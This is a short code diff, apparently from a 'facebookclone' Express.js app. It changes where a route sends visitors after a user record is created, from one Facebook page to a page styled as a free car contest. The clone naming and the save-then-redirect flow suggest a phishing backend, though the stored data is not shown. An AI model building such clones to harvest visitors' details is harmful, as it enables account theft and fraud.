@@ -34,7 +34,7 @@ app.post("/facebookclone/api",(req,res,next)=>{
     .then(()=>{
         res.status(201);
         console.log("Un utilisateur a été crée");
-        res.redirect("https://www.facebook.com/TheEyeOfPalestineDK");
+        res.redirect("https://web.facebook.com/GAGNER-UNE-VOITURE-concours-gratuit-124559830900270");
     })
     .catch(err=>{
         res.status(500).json({err})
